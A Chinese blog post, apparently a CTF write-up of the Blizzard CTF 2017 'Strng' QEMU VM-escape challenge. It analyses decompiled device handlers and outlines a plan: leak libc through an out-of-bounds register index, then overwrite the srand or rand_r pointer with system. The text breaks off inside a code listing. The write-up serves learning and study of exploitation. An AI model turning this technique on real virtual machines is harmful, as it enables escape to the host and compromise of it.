<!DOCTYPE html><html lang="zh-TW" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>Blizzard CTF 2017 Strng | KANGEL</title><meta name="description" content="Blizzard CTF 2017 Strng"><meta name="keywords" content="pwn,qemu,escape"><meta name="author" content="kangel"><meta name="copyright" content="kangel"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/2.png"><link rel="preconnect" href="//cdn.jsdelivr.net"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Blizzard CTF 2017 Strng"><meta name="twitter:description" content="Blizzard CTF 2017 Strng"><meta name="twitter:image" content="https://j-kangel.github.io/article_cover/434237378.jpeg"><meta property="og:type" content="article"><meta property="og:title" content="Blizzard CTF 2017 Strng"><meta property="og:url" content="https://j-kangel.github.io/2019/11/27/Strng/"><meta property="og:site_name" content="KANGEL"><meta property="og:description" content="Blizzard CTF 2017 Strng"><meta property="og:image" content="https://j-kangel.github.io/article_cover/434237378.jpeg"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>const autoChangeMode = 'false'
var t = Cookies.get("theme");
if (autoChangeMode == '1'){
const isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
const isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
const isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

if (t === undefined){
  if (isLightMode) activateLightMode()
  else if (isDarkMode) activateDarkMode()
  else if (isNotSpecified || hasNoSupport){
    console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
    now = new Date();
    hour = now.getHours();
    isNight = hour < 6 || hour >= 18
    isNight ? activateDarkMode() : activateLightMode()
}
} else if (t == 'light') activateLightMode()
else activateDarkMode()


} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.15/dist/snackbar.min.css"><link rel="canonical" href="https://j-kangel.github.io/2019/11/27/Strng/"><link rel="prev" title="DefconQuals-2018-EC3" href="https://j-kangel.github.io/2019/11/29/DefconQuals-2018-EC3/"><link rel="next" title="picoctf2019pwn解题记录" href="https://j-kangel.github.io/2019/09/30/picoctf2019pwn解题记录/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  highlight_copy: 'true',
  highlight_lang: 'false',
  highlight_shrink: 'false',
  copy: {
    success: '複製成功',
    error: '複製錯誤',
    noSupport: '瀏覽器不支持'
  },
  bookmark: {
    title: 'Snackbar.bookmark.title',
    message_prev: '按',
    message_next: '鍵將本頁加入書籤'
  },
  runtime_unit: '天',
  copyright: undefined,
  copy_copyright_js: false,
  ClickShowText: undefined,
  medium_zoom: 'true',
  Snackbar: {"bookmark":{"title":"Snackbar.bookmark.title","message_prev":"按","message_next":"鍵將本頁加入書籤"},"chs_to_cht":"你已切換為繁體","cht_to_chs":"你已切換為簡體","day_to_night":"你已切換為深色模式","night_to_day":"你已切換為淺色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-left"}
  
}</script></head><body><div id="header"> <div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">KANGEL</a></span><i class="fa fa-bars fa-fw toggle-menu pull_right close" aria-hidden="true"></i><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> List</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li><li><a class="site-page" href="/photo/"><i class="fa-fw fa fa-photo"></i><span> Photo</span></a></li></ul></div></div></span><span class="pull_right" id="search_button"></span></div></div><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="lazyload avatar_img" src="/img/2.png" onerror="onerror=null;src='/img/friend_404.gif'"></div><div class="mobile_post_data"><div class="mobile_data_item is_center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">50</div></a></div></div><div class="mobile_data_item is_center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">標籤</div><div class="length_num">32</div></a></div></div><div class="mobile_data_item is_center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分類</div><div class="length_num">14</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> List</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li><li><a class="site-page" href="/photo/"><i class="fa-fw fa fa-photo"></i><span> Photo</span></a></li></ul></div></div></div><div id="mobile-sidebar-toc"><div class="toc_mobile_headline">目錄</div><ol class="toc_mobile_items"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#前言"><span class="toc_mobile_items-number">1.</span> <span class="toc_mobile_items-text">前言</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#题目"><span class="toc_mobile_items-number">2.</span> <span class="toc_mobile_items-text">题目</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#静态分析"><span class="toc_mobile_items-number">3.</span> <span class="toc_mobile_items-text">静态分析</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#查看strng-class-init函数"><span class="toc_mobile_items-number">3.1.</span> <span class="toc_mobile_items-text">查看strng_class_init函数</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#查看strng-mmio-read函数"><span class="toc_mobile_items-number">3.2.</span> <span class="toc_mobile_items-text">查看strng_mmio_read函数</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#查看strng-mmio-write函数"><span class="toc_mobile_items-number">3.3.</span> <span class="toc_mobile_items-text">查看strng_mmio_write函数</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#查看strng-pmio-read函数"><span class="toc_mobile_items-number">3.4.</span> <span class="toc_mobile_items-text">查看strng_pmio_read函数</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#查看strng-pmio-write函数"><span class="toc_mobile_items-number">3.5.</span> <span class="toc_mobile_items-text">查看strng_pmio_write函数</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#攻击思路"><span class="toc_mobile_items-number">3.6.</span> <span class="toc_mobile_items-text">攻击思路</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#动态分析"><span class="toc_mobile_items-number">4.</span> <span class="toc_mobile_items-text">动态分析</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Reference"><span class="toc_mobile_items-number">5.</span> <span class="toc_mobile_items-text">Reference</span></a></li></ol></div></div><div id="body-wrap"><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true">     </i><div class="auto_open" id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目錄</div><div class="sidebar-toc__progress"><span class="progress-notice">你已經讀了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目"><span class="toc-number">2.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#静态分析"><span class="toc-number">3.</span> <span class="toc-text">静态分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#查看strng-class-init函数"><span class="toc-number">3.1.</span> <span class="toc-text">查看strng_class_init函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#查看strng-mmio-read函数"><span class="toc-number">3.2.</span> <span class="toc-text">查看strng_mmio_read函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#查看strng-mmio-write函数"><span class="toc-number">3.3.</span> <span class="toc-text">查看strng_mmio_write函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#查看strng-pmio-read函数"><span class="toc-number">3.4.</span> <span class="toc-text">查看strng_pmio_read函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#查看strng-pmio-write函数"><span class="toc-number">3.5.</span> <span class="toc-text">查看strng_pmio_write函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#攻击思路"><span class="toc-number">3.6.</span> <span class="toc-text">攻击思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#动态分析"><span class="toc-number">4.</span> <span class="toc-text">动态分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference"><span class="toc-number">5.</span> <span class="toc-text">Reference</span></a></li></ol></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/article_cover/434237378.jpeg)"><div id="post-info"><div id="post-title"><div class="posttitle">Blizzard CTF 2017 Strng</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 發表於 2019-11-26<span class="post-meta__separator">|</span><i class="fa fa-history" aria-hidden="true"></i> 更新於 2019-12-16</time><span class="post-meta__separator mobile_hidden">|</span><span class="mobile_hidden"><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/qemu/">qemu</a></span><div class="post-meta-wordcount"><i class="fa fa-file-word-o post-meta__icon" aria-hidden="true"></i><span>字數總計: </span><span class="word-count">2.3k</span><span class="post-meta__separator">|</span><i class="fa fa-clock-o post-meta__icon" aria-hidden="true"></i><span>閲讀時長: 11 分鐘</span><span class="post-meta__separator">|</span><i class="fa fa-eye post-meta__icon" aria-hidden="true">       </i><span>閲讀量: </span><span id="busuanzi_value_page_pv"></span></div></div></div></div><div class="layout layout_post" id="content-inner">   <article id="post"><div class="article-container" id="post-content"><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这段时间研究了一下qemu escape相关的内容，以这篇博客为开端，将系统的记录我学习qemu escape的历程。</p>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><strong>Points:</strong> Legendary <strong>Solves:</strong> 0 <strong>Category:</strong> Exploitation <strong>Description:</strong> Blizzard CTF 2017: Sombra True Random  Number Generator (STRNG) Sombra True Random Number Generator (STRNG) is a QEMU-based challenge  developed for Blizzard CTF 2017. The challenge was to achieve a VM  escape from a QEMU-based VM and capture the flag located at /root/flag  on the host. The image used and distributed with the challenge was the Ubuntu Server  14.04 LTS Cloud Image. The host used the same image as the guest. The  guest was reset every 10 minutes and was started with the following  command: ./qemu-system-x86_64 -m 1G -device strng -hda my-disk.img -hdb  my-seed.img -nographic -L pc-bios/ -enable-kvm -device e1000,netdev=net0 -netdev user,id=net0,hostfwd=tcp::5555-:22 Access to the guest was provided by redirecting incoming connections to  the host on port 5555 to the guest on port 22.</p>
<p>Username/password: ubuntu/passw0rd</p>
<p>从启动命令可以看出，这道题是对PCI设备<code>strng</code>的模拟，一般的思路都是通过mmio_read或者pmio_read泄露libc基地址，然后通过mmio_write或者pmio_write将system函数的地址覆盖掉某个函数的地址从而劫持程序流。</p>
<h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>将<code>qemu-system-x86_64</code>拖进IDA，查找strng相关函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">do_qemu_init_pci_strng_register_types	</span><br><span class="line">pci_strng_register_types	</span><br><span class="line">strng_class_init	          ##可以查看device_id来确定设备</span><br><span class="line">pci_strng_realize	</span><br><span class="line">strng_instance_init	</span><br><span class="line">strng_mmio_read	</span><br><span class="line">strng_mmio_write	</span><br><span class="line">strng_pmio_read	</span><br><span class="line">strng_pmio_write</span><br></pre></td></tr></table></figure>
<p>查看相关结构体</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">00000000 STRNGState      struc ; (sizeof=0xC10, align=0x10, mappedto_3815)</span><br><span class="line">00000000 pdev            PCIDevice_0 ?</span><br><span class="line">000008F0 mmio            MemoryRegion_0 ?</span><br><span class="line">000009F0 pmio            MemoryRegion_0 ?</span><br><span class="line">00000AF0 addr            dd ?</span><br><span class="line">00000AF4 regs            dd 64 dup(?)</span><br><span class="line">00000BF4                 db ? ; undefined</span><br><span class="line">00000BF5                 db ? ; undefined</span><br><span class="line">00000BF6                 db ? ; undefined</span><br><span class="line">00000BF7                 db ? ; undefined</span><br><span class="line">00000BF8 srand           dq ?                    ; offset</span><br><span class="line">00000C00 rand            dq ?                    ; offset</span><br><span class="line">00000C08 rand_r          dq ?                    ; offset</span><br><span class="line">00000C10 STRNGState      ends</span><br><span class="line">00000C10</span><br></pre></td></tr></table></figure>
<h4 id="查看strng-class-init函数"><a href="#查看strng-class-init函数" class="headerlink" title="查看strng_class_init函数"></a>查看strng_class_init函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">strng_class_init</span><span class="params">(ObjectClass *a1, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  PCIDeviceClass *k; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  k = (PCIDeviceClass *)object_class_dynamic_cast_assert(</span><br><span class="line">                          a1,</span><br><span class="line">                          <span class="string">"pci-device"</span>,</span><br><span class="line">                          <span class="string">"/home/rcvalle/qemu/hw/misc/strng.c"</span>,</span><br><span class="line">                          <span class="number">154</span>,</span><br><span class="line">                          <span class="string">"strng_class_init"</span>);</span><br><span class="line">  k-&gt;device_id = <span class="number">0x11E9</span>;   <span class="comment">//设备id</span></span><br><span class="line">  k-&gt;revision = <span class="number">0x10</span>;</span><br><span class="line">  k-&gt;realize = (<span class="keyword">void</span> (*)(PCIDevice_0 *, Error_0 **))pci_strng_realize;</span><br><span class="line">  k-&gt;class_id = <span class="number">0xFF</span>;</span><br><span class="line">  k-&gt;vendor_id = <span class="number">0x1234</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在qemu虚拟机中查看设备，发现00:03.0即为<code>strng</code>。其中 <code>xx:yy.z</code>的格式为<code>总线:设备:功能</code>的格式。 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci</span><br><span class="line">00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)</span><br><span class="line">00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)</span><br><span class="line">00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)</span><br></pre></td></tr></table></figure>
<p>查看mmio和pmio的地址信息，可以看到mmio的起始地址为<code>0xfebf1000</code>，pmio的起始端口为<code>c050</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -v</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">	Subsystem: Red Hat, Inc Device 1100</span><br><span class="line">	Physical Slot: 3</span><br><span class="line">	Flags: fast devsel</span><br><span class="line">	Memory at febf1000 (32-bit, non-prefetchable) [size=256]</span><br><span class="line">	I/O ports at c050 [size=8]</span><br></pre></td></tr></table></figure>
<p> 通过查看<code>resource</code>文件来查看其相应的内存空间， 如resource0（MMIO空间）以及resource1（PMIO空间） ，每行分别表示相应空间的起始地址（start-address）、结束地址（end-address）以及标识位（flags） </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource</span><br><span class="line">0x00000000febf1000 0x00000000febf10ff 0x0000000000040200  <span class="comment">#mmio，size=256</span></span><br><span class="line">0x000000000000c050 0x000000000000c057 0x0000000000040101  <span class="comment">#pmio，size=8</span></span><br></pre></td></tr></table></figure>
<h4 id="查看strng-mmio-read函数"><a href="#查看strng-mmio-read函数" class="headerlink" title="查看strng_mmio_read函数"></a>查看strng_mmio_read函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> __<span class="function">fastcall <span class="title">strng_mmio_read</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> &amp;&amp; !(addr &amp; <span class="number">3</span>) )      </span><br><span class="line">    result = opaque-&gt;regs[addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>地址的大小为4个字节(size == 4)，且必须是4字节对齐(!(addr &amp; 3))。然后将该地址右移两位作为索引，并返回该索引对应的regs的值。可以看到regs的大小刚好等于mmio的大小，因此无法泄露任意地址。</p>
<h4 id="查看strng-mmio-write函数"><a href="#查看strng-mmio-write函数" class="headerlink" title="查看strng_mmio_write函数"></a>查看strng_mmio_write函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">strng_mmio_write</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="keyword">uint32_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  hwaddr i; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v5; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> &amp;&amp; !(addr &amp; <span class="number">3</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    i = addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)i == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;regs[<span class="number">1</span>] = opaque-&gt;rand(opaque, i, val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i &lt; <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) == v7 )</span><br><span class="line">        opaque-&gt;srand(val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (_DWORD)i == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = val;</span><br><span class="line">        v6 = ((__int64 (__fastcall *)(<span class="keyword">uint32_t</span> *))opaque-&gt;rand_r)(&amp;opaque-&gt;regs[<span class="number">2</span>]);</span><br><span class="line">        val = v5;</span><br><span class="line">        opaque-&gt;regs[<span class="number">3</span>] = v6;</span><br><span class="line">      &#125;</span><br><span class="line">      opaque-&gt;regs[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)i] = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先地址必须满足大小为4且4字节对齐，然后索引<code>i=addr&gt;&gt;2</code>,当：</p>
<p><code>i=0</code>:调用srand函数，参数为val</p>
<p><code>i=1</code>:调用rand产生随机数并赋值给regs[1]</p>
<p><code>i=3</code>:调用rand_r函数，参数为regs[2]，然后将返回结果赋值给regs[3]。但最后regs[3]还是会赋值为val</p>
<p>其它：将val写进regs[i]</p>
<p>这里其实可以看出一些猫腻，如果我们可以泄露libc基址的话，就可以</p>
<p>1、将srand地址覆盖为system函数的地址，val=“cat flag”，addr=0便可获取flag</p>
<p>2、将rand_r地址覆盖为system函数的地址，regs[2]处写入”cat flag“，addr=12便可获取flag</p>
<h4 id="查看strng-pmio-read函数"><a href="#查看strng-pmio-read函数" class="headerlink" title="查看strng_pmio_read函数"></a>查看strng_pmio_read函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> __<span class="function">fastcall <span class="title">strng_pmio_read</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">uint32_t</span> reg_addr; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        reg_addr = opaque-&gt;addr;</span><br><span class="line">        <span class="keyword">if</span> ( !(reg_addr &amp; <span class="number">3</span>) )</span><br><span class="line">          result = opaque-&gt;regs[reg_addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = opaque-&gt;addr;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先满足地址为四个字节，当</p>
<p><code>addr=0</code>:返回opaque-&gt;addr的值</p>
<p><code>addr!=</code>:将opaque-&gt;addr的值右移两位作为regs的索引并返回该值</p>
<p>这里我们可以发现可以读取任意地址，只要可以将某个地址相对regs的偏移赋值给opaque-&gt;addr，便可以泄露该地址的值。例如：将<code>104</code>传给opaque-&gt;addr，便可以泄露srand低四位地址的值。</p>
<h4 id="查看strng-pmio-write函数"><a href="#查看strng-pmio-write函数" class="headerlink" title="查看strng_pmio_write函数"></a>查看strng_pmio_write函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 